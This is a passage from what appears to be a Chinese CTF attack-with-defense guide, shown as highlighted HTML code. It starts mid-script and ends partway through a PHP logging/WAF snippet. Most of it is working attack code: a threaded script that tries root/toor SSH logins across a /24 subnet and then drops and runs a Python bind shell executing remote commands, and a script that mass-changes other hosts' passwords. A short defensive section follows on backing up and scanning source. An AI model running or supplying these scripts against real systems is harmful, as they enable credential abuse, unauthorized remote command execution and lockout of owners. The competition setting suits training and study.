 ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>hostname<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>username<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span>\n\n    stdin<span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">,</span>stderr <span class=\"token operator\">=</span> ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n\n    result <span class=\"token operator\">=</span> stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> result <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"无结果!\"</span><span class=\"token punctuation\">)</span>\n        result <span class=\"token operator\">=</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \na <span class=\"token operator\">=</span> ssh_base_pwd<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果可以登录而且有python环境可以尝试使用下面这个python批量ssh登录并反弹python shell</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#-*- coding:utf-8 -*-</span>\n<span class=\"token keyword\">import</span> paramiko\n<span class=\"token keyword\">import</span> threading\n<span class=\"token keyword\">import</span> queue\n<span class=\"token keyword\">import</span> time\n<span class=\"token comment\">#反弹shell python</span>\n\nq<span class=\"token operator\">=</span>queue<span class=\"token punctuation\">.</span>Queue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#lock = threading.Lock()</span>\n\n<span class=\"token comment\"># ssh 用户名 密码 登陆</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">ssh_base_pwd</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span>\n    ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>hostname<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>username<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span>\n\n    stdin<span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">,</span>stderr <span class=\"token operator\">=</span> ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n\n    result <span class=\"token operator\">=</span> stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> result <span class=\"token punctuation\">:</span>\n        result <span class=\"token operator\">=</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    shell <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\n    #服务器端\n    import socket\n    import os\n    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\n    s.bind(('0.0.0.0',1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接\n    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量\n    con,addr=s.accept()     #接受一个客户端的连接\n    #print(con,addr)\n\n    for i in range(10):\n        cmd=con.recv(1024)\n        print(cmd)\n        command=cmd.decode()\n        if command.startswith('cd'):\n            os.chdir(command[2:].strip())   #切换路径\n            result=os.getcwd()      #显示路径\n        else:\n            result=os.popen(command).read()\n        if result:\n            con.send(result.encode())\n        else:\n            con.send(b'OK!')\n    '''</span>\n    cmd <span class=\"token operator\">=</span> <span class=\"token string\">'echo \\\"%s\\\" > ./shell.py'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">'&amp;&amp; python3 ./shell.py'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'22'</span>\n    username <span class=\"token operator\">=</span> <span class=\"token string\">'root'</span>\n    passwd <span class=\"token operator\">=</span> <span class=\"token string\">'toor'</span>\n    \n    ip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.1.&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n    q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>block<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>\n    ip_demo<span class=\"token operator\">=</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#判断是否成功</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#lock.acquire()</span>\n        res <span class=\"token operator\">=</span> ssh_base_pwd<span class=\"token punctuation\">(</span>ip_demo<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token operator\">=</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ + ]Ip: %s\"</span> <span class=\"token operator\">%</span> ip_demo <span class=\"token operator\">+</span><span class=\"token string\">\" is success!!! [ + ]\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#lock.release()</span>\n            ssh_base_pwd<span class=\"token punctuation\">(</span>ip_demo<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ - ]Ip: %s\"</span> <span class=\"token operator\">%</span> ip_demo <span class=\"token operator\">+</span><span class=\"token string\">\" is Failed\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> x <span class=\"token operator\">></span> <span class=\"token number\">255</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Finshed!!!!!!!!\"</span><span class=\"token punctuation\">)</span>\n    q<span class=\"token punctuation\">.</span>task_done<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token comment\">#线程队列部分</span>\nth<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nth_num<span class=\"token operator\">=</span><span class=\"token number\">255</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        t<span class=\"token operator\">=</span>threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>main<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        th<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        th<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        th<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n\n<span class=\"token comment\">#q.join()所有任务完成</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们改密码是为了防止被别人弱口令爆破，或者密码是默认的情况导致服务器丢失，这里我们也可以尝试去更改别人的密码</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> paramiko\n<span class=\"token keyword\">import</span> sys\n\nssh_clients <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\ntimeout <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\nnew_password <span class=\"token operator\">=</span> <span class=\"token string\">\"xcxy@ncwss123\"</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">SSH_Client</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>is_root <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n        self<span class=\"token punctuation\">.</span>host <span class=\"token operator\">=</span> host\n        self<span class=\"token punctuation\">.</span>port <span class=\"token operator\">=</span> port\n        self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">=</span> username\n        self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> password\n        self<span class=\"token punctuation\">.</span>ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span>timeout<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">exec_command</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">change_password</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span><span class=\"token string\">\"passwd\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">!=</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">:</span>\n            stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span>\n        stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> new_password<span class=\"token punctuation\">)</span>\n        stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> new_password<span class=\"token punctuation\">)</span>\n        stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"success\"</span> <span class=\"token keyword\">in</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> new_password\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">save_log</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a+\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s %s %s %s\\n\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage:\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t python %s [FILENAME]\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    filename <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Loading file : %s\"</span> <span class=\"token operator\">%</span> filename<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n            line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n            data <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n            host <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            username <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n            password <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Trying login : %s\"</span> <span class=\"token operator\">%</span> host<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                ssh_client <span class=\"token operator\">=</span> SSH_Client<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [-] %s\"</span> <span class=\"token operator\">%</span> e<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">continue</span>\n            ssh_clients<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ssh_client<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Login finished. \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+&#125; Got [%d] clients. \"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ssh_clients<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ssh_clients<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Starting changing password. \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> ssh_client <span class=\"token keyword\">in</span> ssh_clients<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> ssh_client<span class=\"token punctuation\">.</span>change_password<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] %s (Success!)\"</span> <span class=\"token operator\">%</span> ssh_client<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">)</span>\n            ssh_client<span class=\"token punctuation\">.</span>save_log<span class=\"token punctuation\">(</span><span class=\"token string\">\"success.log\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] %s (Failed!)\"</span> <span class=\"token operator\">%</span> ssh_client<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] something like interesting!!! \"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"下载源码，备份\"><a href=\"#下载源码，备份\" class=\"headerlink\" title=\"下载源码，备份\"></a>下载源码，备份</h2><p>使用ssh工具保留源码，复制两份，用d盾去扫一份<br>以免网站崩溃的时候无法及时恢复，导致check丢分</p>\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><p>上面提到我们将源码down下来后利用d盾等工具扫描，将爆出来的shell注释修改或者删除等（具体怎么改根据比赛要求）</p>\n<p>接着就是监控脚本</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'LOG_FILEDIR'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/tmp/loooooooogs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//日志文件目录</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILEDIR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//如果目录不存在则创建</span>\n\t<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILEDIR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//创建目录</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span> \n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'getallheaders'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//获取所有的头信息</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//循环获取所有的头信息</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'HTTP_'</span><span class=\"token punctuation\">)</span> \n<span class=\"token variable\">$headers</span><span class=\"token punctuation\">[</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'-'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">ucwords</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//将头信息的名称替换为小写，并将下划线替换为空格</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">return</span> <span class=\"token variable\">$headers</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//获取get参数 </span>\n<span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取post参数</span>\n<span class=\"token variable\">$cookie</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取cookie参数</span>\n<span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取所有的头信息</span>\n<span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取所有的上传文件信息</span>\n<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string 